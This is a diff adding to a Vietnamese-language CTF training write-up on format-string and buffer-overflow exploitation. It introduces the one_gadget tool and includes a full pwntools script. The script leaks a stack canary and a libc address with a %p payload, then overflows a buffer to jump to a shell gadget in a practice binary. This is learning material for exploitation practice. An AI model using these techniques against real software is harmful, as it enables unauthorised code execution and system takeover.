@@ -26,4 +26,46 @@ Lưu ý khi fread() đọc dữ liệu từ file vào chương trình, khi đó 
 để thay đổi dữ liệu của một biến, ta sẽ cho in ra %{giá trị cần thay đổi}$c sau đó dùng %n để đọc các byte đã in ra và lưu vào địa chỉ mà %n trỏ đến  
 Trường hợp giá trị cần thay đổi quá lớn thì có thể chia thành 2 lần in, tuy nhiên lần thứ 2, %n sẽ đọc n byte của lần 1 và cộng m byte của lần 2
 
-Bài này em chưa xong =)))
+# FMT & BOF
+ở đây ta sử dụng một công cụ mới khi bof ret2libc là one_gadget, one_gadget có chức năng liệt kê ra các system('/bin/sh') và các điều kiện đi kèm, thường dùng cho trường hợp PIE bật.
+cú pháp: ``` one_gadget tênfile ```
+![image](https://user-images.githubusercontent.com/111769169/221520986-6851fe89-f872-4afa-84c2-d708f57fafd1.png)  
+
+<details> <summary> script </summary>
+
+```python3
+from pwn import *
+exe = ELF("./fmtstr4_patched")
+libc = ELF("./libc-2.31.so")
+p = process(exe.path)
+gdb.attach(p, gdbscript = '''
+
+b*main+354
+c
+           ''')
+input()
+
+payload = b'01234456789 %21$p %23$p'
+p.sendafter(b"ID: ", payload)
+p.sendafter(b'Password: ', b'&WPAbC&M!%8S5X#W')
+p.recvuntil(b"01234456789 ")
+
+canary = int(p.recv(18), 16)
+leak_libc = int(p.recvuntil(b"Enter", drop = True)[1:], 16)
+libc.address = leak_libc - 0x24083
+log.info('canary: ' + hex(canary))
+log.info('leak libc: ' + hex(leak_libc))
+log.info('base: ' + hex(libc.address))
+log.info('system ' + hex(libc.sym['system']))
+
+one_gadget = libc.address + 0xe3b01
+payload2 = b'a' * 56 + p64(canary) + b'b' *8
+payload2 +=  p64(one_gadget)
+p.sendafter(b"your secret: ", payload2)
+p.interactive()
+```
+
+</details>
+
+# Tấn công bảng GOT
+[FMT_Xmaster.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/FMT_Xmaster.md)
